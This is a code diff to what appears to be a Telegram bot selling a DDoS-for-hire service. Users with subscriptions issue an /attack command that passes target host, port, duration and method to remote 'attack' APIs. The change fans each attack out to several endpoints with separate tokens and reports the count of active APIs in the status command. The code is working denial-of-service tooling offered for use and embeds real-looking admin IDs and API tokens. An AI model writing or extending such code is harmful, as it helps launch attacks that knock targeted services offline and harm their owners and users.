@@ -14,8 +14,16 @@ try {
     users: {},
     adminId: 6456655262,
     notificationGroupId: -4764306375,
-    apiUrl: "https://apikey-production.up.railway.app/api/attack",
-    apiToken: "dispenser"
+    apis: [
+      {
+        url: "https://apikey-production.up.railway.app/api/attack",
+        token: "dispenser"
+      },
+      {
+        url: "https://apikey-production.up.railway.app/api/attack",
+        token: "isalmods"
+      }
+    ]
   };
   fs.writeFileSync('./config.json', JSON.stringify(config, null, 2));
 }
@@ -193,9 +201,14 @@ bot.command('attack', async (ctx) => {
       `🔑 Attack ID: ${attackId}`
     );
     
-    // Send request to API
-    const apiUrl = `${config.apiUrl}?token=${config.apiToken}&target=${host}&time=${time}&method=${method}&port=${port}`;
-    const response = await axios.get(apiUrl);
+    // Send request to all configured APIs
+    const apiRequests = config.apis.map(async (api) => {
+      const apiUrl = `${api.url}?token=${api.token}&target=${host}&time=${time}&method=${method}&port=${port}`;
+      return axios.get(apiUrl);
+    });
+    
+    // Wait for all API requests to complete
+    await Promise.all(apiRequests);
     
     // Store attack details
     ongoingAttacks.set(attackId, {
@@ -245,13 +258,17 @@ bot.command('status', (ctx) => {
     if (attack.userId === userId) userOngoingAttacks++;
   });
   
+  // Count total APIs
+  const apiCount = config.apis.length;
+  
   ctx.reply(
     `📊 Account Status:\n` +
     `👤 User ID: ${userId}\n` +
     `⏱️ Max Time: ${user.maxTime} seconds\n` +
     `🔢 Concurrent Limit: ${user.concurrentLimit}\n` +
     `🔄 Currently Running: ${userOngoingAttacks}/${user.concurrentLimit}\n` +
-    `⏳ Subscription: ${formatTimeRemaining(userId)}`
+    `⏳ Subscription: ${formatTimeRemaining(userId)}\n` +
+    `🔌 Active APIs: ${apiCount}`
   );
 });
 
